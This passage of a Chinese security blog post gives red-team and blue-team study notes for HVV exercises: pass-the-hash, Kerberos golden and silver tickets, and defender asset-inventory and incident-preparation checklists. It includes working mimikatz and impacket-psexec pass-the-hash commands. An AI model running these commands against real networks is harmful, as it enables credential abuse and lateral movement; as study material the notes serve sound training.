<h6 id="WinRM-可以做什么"><a href="#WinRM-可以做什么" class="headerlink" title="WinRM 可以做什么"></a>WinRM 可以做什么</h6><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414173440301.png" alt="image-20240414173440301" style="zoom:80%;" />

<h5 id="Pass-The-Hash（PTH）"><a href="#Pass-The-Hash（PTH）" class="headerlink" title="Pass The Hash（PTH）"></a>Pass The Hash（PTH）</h5><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414173531656.png" alt="image-20240414173531656" style="zoom:80%;" />

<h6 id="不同的-PTH-思路"><a href="#不同的-PTH-思路" class="headerlink" title="不同的 PTH 思路"></a>不同的 PTH 思路</h6><p><strong>mimikatz</strong></p>
<p>​	mimikatz sekurlsa::pth模块的思路是通过修改内存的方法，将当前用户存储于lsass中的凭证替换为攻击者凭证实现PTH</p>
<p><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:aministrator /domain:system /ntlm:bash&quot; exit</code></p>
<p><strong>impacket</strong></p>
<p>​	impacket通过对上层协议的重新实现，更改认证流程，直接将攻击者凭证用于认证的方式实现PTH</p>
<p><code>impacket-psexec -hashes :hash ./Administrator@10.10.1.1 &#39;whoami&#39;</code></p>
<h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><h3 id="域渗透前置知识"><a href="#域渗透前置知识" class="headerlink" title="域渗透前置知识"></a>域渗透前置知识</h3><h4 id="什么是域"><a href="#什么是域" class="headerlink" title="什么是域"></a>什么是域</h4><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414174420234.png" alt="image-20240414174420234" style="zoom:80%;" />

<h4 id="什么是域控制器"><a href="#什么是域控制器" class="headerlink" title="什么是域控制器"></a>什么是域控制器</h4><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414174516392.png" alt="image-20240414174516392" style="zoom:80%;" />

<h4 id="什么是活动目录"><a href="#什么是活动目录" class="headerlink" title="什么是活动目录"></a>什么是活动目录</h4><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414174630607.png" alt="image-20240414174630607" style="zoom:80%;" />

<h4 id="什么是SAM"><a href="#什么是SAM" class="headerlink" title="什么是SAM"></a>什么是SAM</h4><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414175315075.png" alt="image-20240414175315075" style="zoom:80%;" />

<h3 id="kerberos-认证"><a href="#kerberos-认证" class="headerlink" title="kerberos 认证"></a>kerberos 认证</h3><ol>
<li>请求发起用户级（client）</li>
<li>服务提供机（server）</li>
<li>域控管理机（Domain Controller,DC)，又称密钥分发中心（Key Distribution Center，KDC）</li>
</ol>
<ul>
<li>账户数据库（Account Database，AD，存储域内用户Hash）</li>
<li>认证服务（Authenication Service,AS)</li>
<li>票据授予服务（Ticke Granting Service，TGS）</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414180105587.png" alt="image-20240414180105587"></p>
<h3 id="域环境的PTH攻击–PTT"><a href="#域环境的PTH攻击–PTT" class="headerlink" title="域环境的PTH攻击–PTT"></a>域环境的PTH攻击–PTT</h3><h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h4><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414180921979.png" alt="image-20240414180921979" style="zoom:80%;" />

<h5 id="制作金票的条件"><a href="#制作金票的条件" class="headerlink" title="制作金票的条件"></a>制作金票的条件</h5><ul>
<li>域名称</li>
<li>域的 sid 值</li>
<li>域的 KRBTGT 账户密码 HASH</li>
<li>伪造用户名，可以是任意的</li>
</ul>
<h5 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h5><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414181157406.png" alt="image-20240414181157406" style="zoom:80%;" />

<h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h4><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414181239168.png" alt="image-20240414181239168" style="zoom:80%;" />

<h5 id="制作银票的条件"><a href="#制作银票的条件" class="headerlink" title="制作银票的条件"></a>制作银票的条件</h5><ul>
<li>域名称</li>
<li>域的 SID 值</li>
<li>可利用的服务</li>
<li>伪造的用户名，可以是任意用户名</li>
<li>服务账号的 NTLM Hash</li>
</ul>
<h5 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h5><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414181558556.png" alt="image-20240414181558556" style="zoom:80%;" />

<h4 id="黄金票据与白银票据的区别"><a href="#黄金票据与白银票据的区别" class="headerlink" title="黄金票据与白银票据的区别"></a>黄金票据与白银票据的区别</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.访问权限不同</span><br><span class="line">    Golden Ticket: 伪造 TGT，可以获取任何 Kerberos 服务权限</span><br><span class="line">    Silver Ticket：伪造 TGS，只能访问指定的服务</span><br><span class="line">2.加密方式不同</span><br><span class="line">    Golden Ticket 由 Kerberos 的 Hash——&gt; krbtgt 加密</span><br><span class="line">    Silver Ticket 由服务器端密码的 Hash值——&gt; mster key 加密</span><br><span class="line">3.认证流程不同</span><br><span class="line">    Golden Ticket 的利用过程需要访问域控（KDC）</span><br><span class="line">    Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</span><br></pre></td></tr></table></figure>

<h1 id="传统甲方HVV准备"><a href="#传统甲方HVV准备" class="headerlink" title="传统甲方HVV准备"></a>传统甲方HVV准备</h1><h2 id="资产梳理"><a href="#资产梳理" class="headerlink" title="资产梳理"></a>资产梳理</h2><ul>
<li>域名资产</li>
<li>IP 资产<ul>
<li>服务器<ul>
<li>业务服务器</li>
<li>负载均衡 &amp; 防护设备</li>
</ul>
</li>
<li>主机</li>
<li>硬件设施</li>
</ul>
</li>
</ul>
<h3 id="面临的问题"><a href="#面临的问题" class="headerlink" title="面临的问题"></a>面临的问题</h3><p>​	资产分布不均，无法全部梳理</p>
<h3 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h3><ul>
<li>公开收集<ul>
<li>FoFa</li>
<li>ZoomEye</li>
<li>Shodan</li>
</ul>
</li>
<li>内部整理<ul>
<li>it &amp; 运维部门进行协助</li>
<li>扫描</li>
</ul>
</li>
</ul>
<h2 id="资产问题排查"><a href="#资产问题排查" class="headerlink" title="资产问题排查"></a>资产问题排查</h2><h3 id="基线检查"><a href="#基线检查" class="headerlink" title="基线检查"></a>基线检查</h3><p>​	针对已整理的对外服务资产进行基线检查，需符合上级或部门要求</p>
<h3 id="Lol基础扫描"><a href="#Lol基础扫描" class="headerlink" title="Lol基础扫描"></a>Lol基础扫描</h3><p>​	针对已整理的资产进行第一遍基础扫描，包括存活、端口、服务、漏洞（主机漏洞以及Web漏洞）</p>
<h3 id="溯源备份"><a href="#溯源备份" class="headerlink" title="溯源备份"></a>溯源备份</h3><p>​	要求对外提供服务的资产务必开启系统日志，Web日志，以及有必要保存的日志</p>
<h3 id="责任划分"><a href="#责任划分" class="headerlink" title="责任划分"></a>责任划分</h3><p>​	资产由专业部门进行负责，安全团队辅助对接</p>
<h3 id="解决难点"><a href="#解决难点" class="headerlink" title="解决难点"></a>解决难点</h3><ul>
<li>域名过多，解析主机随时变更</li>
<li>服务器服务版本过低，升级难度大</li>
<li>主机漏洞原理异常，排查困难</li>
<li>大量无人认领服务器，但是业务中需要使用</li>
<li>搭建大量历史测试系统</li>
</ul>
<h2 id="应急预案"><a href="#应急预案" class="headerlink" title="应急预案"></a>应急预案</h2><h3 id="历史漏洞应急预案"><a href="#历史漏洞应急预案" class="headerlink" title="历史漏洞应急预案"></a>历史漏洞应急预案</h3><h3 id="1day或nday攻击预案"><a href="#1day或nday攻击预案" class="headerlink" title="1day或nday攻击预案"></a>1day或nday攻击预案</h3><h3 id="解决难点-1"><a href="#解决难点-1" class="headerlink" title="解决难点"></a>解决难点</h3><ul>
<li>应急需要安全相关人员处理</li>
<li>历史漏洞排查不全面</li>
</ul>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">John Doe</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2024/04/15/%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2024/04/15/%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F/')">红队蓝队hvv</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2024/04/15/%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=红队蓝队hvv&amp;url=http://example.com/2024/04/15/%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Hexo</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2024/04/15/hello-world%20-%20%E5%89%AF%E6%9C%AC/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">辅导时间李逵负荆雷克萨杜拉拉开发打撒</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description"></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%92%93%E9%B1%BC"><span class="toc-number">1.</span> <span class="toc-text">钓鱼</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">外网打点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%93%9D%E9%98%9F"><span class="toc-number">3.</span> <span class="toc-text">蓝队</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A4%E8%AF%86%E7%9B%91%E6%8E%A7%EF%BC%88%E5%81%9A%E4%BB%80%E4%B9%88%EF%BC%89"><span class="toc-number">3.1.</span> <span class="toc-text">认识监控（做什么）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AWVS%E7%89%B9%E5%BE%81"><span class="toc-number">3.1.1.</span> <span class="toc-text">AWVS特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Appscan%E3%80%81Nessus"><span class="toc-number">3.1.2.</span> <span class="toc-text">Appscan、Nessus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9CMOZI"><span class="toc-number">3.1.3.</span> <span class="toc-text">僵尸网络MOZI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%91%E6%8E%A7%E6%96%B9%E6%B3%95%EF%BC%88%E6%80%8E%E4%B9%88%E5%81%9A%EF%BC%89"><span class="toc-number">3.2.</span> <span class="toc-text">监控方法（怎么做）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%86%E6%9E%90%E6%98%AF%E5%90%A6%E4%B8%BA%E5%B7%A5%E5%85%B7%E6%94%BB%E5%87%BB"><span class="toc-number">3.2.1.</span> <span class="toc-text">如何分析是否为工具攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%B7%A5%E5%85%B7%E7%89%B9%E5%BE%81"><span class="toc-number">3.2.2.</span> <span class="toc-text">常见的工具特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%B7%A5%E5%85%B7%E8%AF%86%E5%88%AB"><span class="toc-number">3.2.3.</span> <span class="toc-text">漏洞工具识别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E7%82%B9%E6%B3%A8%E6%84%8F%E6%9C%A8%E9%A9%AC"><span class="toc-number">3.2.4.</span> <span class="toc-text">重点注意木马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E6%80%9D%E8%B7%AF%EF%BC%88%E4%B8%BA%E4%BB%80%E4%B9%88%EF%BC%89"><span class="toc-number">3.3.</span> <span class="toc-text">分析思路（为什么）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91"><span class="toc-number">4.</span> <span class="toc-text">内网横向</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.1.</span> <span class="toc-text">内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E7%82%B9%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.1.1.</span> <span class="toc-text">入口点信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE"><span class="toc-number">4.1.1.1.</span> <span class="toc-text">查看网络配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5"><span class="toc-number">4.1.1.2.</span> <span class="toc-text">查看网络连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%99%BB%E5%BD%95%E6%97%A5%E5%BF%97"><span class="toc-number">4.1.1.3.</span> <span class="toc-text">查看登录日志</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Linux"><span class="toc-number">4.1.1.3.1.</span> <span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Windows"><span class="toc-number">4.1.1.3.2.</span> <span class="toc-text">Windows</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.1.1.4.</span> <span class="toc-text">杀毒软件信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Windows%E6%9F%A5%E7%9C%8B%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">4.1.1.4.1.</span> <span class="toc-text">Windows查看杀毒软件的方法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF"><span class="toc-number">4.1.1.5.</span> <span class="toc-text">收集密码信息</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">4.1.1.5.1.</span> <span class="toc-text">利用mimikatz获取用户密码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%94%B6%E9%9B%86%E5%88%B0%E7%9A%84%E5%AF%86%E7%A0%81hash-%E6%A3%80%E6%B5%8B%E5%90%8C%E7%BD%91%E6%AE%B5%E6%98%AF%E5%90%A6%E6%9C%89%E7%9B%B8%E5%90%8C%E5%AF%86%E7%A0%81%E7%9A%84%E4%B8%BB%E6%9C%BA"><span class="toc-number">4.1.1.5.2.</span> <span class="toc-text">利用收集到的密码hash 检测同网段是否有相同密码的主机</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8nbtscan%E5%AF%B9135%E7%AB%AF%E5%8F%A3%E5%81%9A%E5%9F%9F%E6%8E%A2%E6%B5%8B"><span class="toc-number">4.1.2.</span> <span class="toc-text">利用nbtscan对135端口做域探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E6%94%B6%E9%9B%86%E5%88%B0%E7%9A%84%E7%BD%91%E6%AE%B5%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">4.1.3.</span> <span class="toc-text">对收集到的网段进行端口漏洞扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91"><span class="toc-number">4.2.</span> <span class="toc-text">代理转发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86"><span class="toc-number">4.2.1.</span> <span class="toc-text">正向代理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#socks%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.2.1.1.</span> <span class="toc-text">socks协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7%E5%8F%8A%E4%B8%8D%E5%90%8C%E5%B9%B3%E5%8F%B0%E7%9A%84%E4%BB%A3%E7%90%86%E9%93%BE%E5%B7%A5%E5%85%B7"><span class="toc-number">4.2.1.2.</span> <span class="toc-text">常见的转发工具及不同平台的代理链工具</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86"><span class="toc-number">4.2.2.</span> <span class="toc-text">反向代理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E6%89%A9%E7%82%B9"><span class="toc-number">4.3.</span> <span class="toc-text">横向扩点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E8%AE%A4%E8%AF%81%E5%88%86%E7%B1%BB"><span class="toc-number">4.3.1.</span> <span class="toc-text">Windows认证分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81"><span class="toc-number">4.3.1.1.</span> <span class="toc-text">本地认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E4%B8%BB%E6%9C%BA%E8%BF%9B%E8%A1%8CNTLM%E8%AE%A4%E8%AF%81"><span class="toc-number">4.3.1.2.</span> <span class="toc-text">远程主机进行NTLM认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A4%E8%AF%81%E8%AF%A6%E7%BB%86%E6%B5%81%E7%A8%8B"><span class="toc-number">4.3.1.3.</span> <span class="toc-text">认证详细流程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%94%BB%E5%87%BB"><span class="toc-number">4.3.2.</span> <span class="toc-text">横向移动攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%94%BB%E5%87%BB"><span class="toc-number">4.3.3.</span> <span class="toc-text">如何进行横向移动攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%87%AD%E8%AF%81%E6%83%85%E5%86%B5"><span class="toc-number">4.3.3.1.</span> <span class="toc-text">无凭证情况</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89%E5%87%AD%E8%AF%81%E6%83%85%E5%86%B5"><span class="toc-number">4.3.3.2.</span> <span class="toc-text">有凭证情况</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#RDP-%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.3.3.2.1.</span> <span class="toc-text">RDP 协议</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#RDP-%E5%B8%B8%E8%A7%84%E8%BF%9E%E6%8E%A5"><span class="toc-number">4.3.3.2.1.1.</span> <span class="toc-text">RDP 常规连接</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-Linux-%E7%B3%BB%E7%BB%9F%E5%88%9B%E5%BB%BA-RDP-%E8%BF%9E%E6%8E%A5"><span class="toc-number">4.3.3.2.1.2.</span> <span class="toc-text">通过 Linux 系统创建 RDP 连接</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-rdp%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E8%BF%9E%E6%8E%A5"><span class="toc-number">4.3.3.2.1.3.</span> <span class="toc-text">通过.rdp文件创建连接</span></a></li></ol></li><li class="toc-item 